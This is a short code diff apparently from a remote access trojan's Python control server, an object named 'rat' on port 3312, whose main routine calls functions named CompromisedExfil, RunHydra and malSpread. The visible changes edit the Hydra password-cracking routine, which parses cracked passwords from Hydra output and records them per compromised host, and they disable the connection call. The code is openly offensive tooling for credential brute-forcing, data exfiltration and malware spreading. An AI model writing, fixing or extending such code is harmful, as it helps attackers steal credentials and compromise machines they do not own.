@@ -46,10 +46,10 @@ class SERVER:
         file.close()
 
     def RunHydra(self):
-        runHydra = False
         fileList = os.listdir(".")
         for file in fileList:
             if file.endswith(".pc"):
+                runHydra = False
                 print ("Checking File: " + file)
                 with open(file) as thisFile:
                     for line in thisFile:
@@ -57,7 +57,7 @@ class SERVER:
                             print('password or hydra attempt present')
                             runHydra = False
                         else:
-                            #print('no password or hydra attempt')
+                            #checking line for either string indicating that hydra is not needed
                             runHydra=True
                             break
 
@@ -72,7 +72,7 @@ class SERVER:
                         password = str(hResult.stdout)[passIndex:]
                         endIndex = password.find("1 of 1") #find end of password
                         password = password[0:endIndex-2]
-                        print("password is : " + password)
+                        print("Hydra found password is : " + password)
                         thisFile.write('\n'+ 'password: ' + password)
 
                     else:
@@ -267,7 +267,7 @@ rat = SERVER('0.0.0.0', 3312)
 
 
 if __name__ == '__main__':
-    rat.connection()
+    #rat.connection()
     rat.CompromisedExfil()
     rat.RunHydra()
     rat.malSpread()
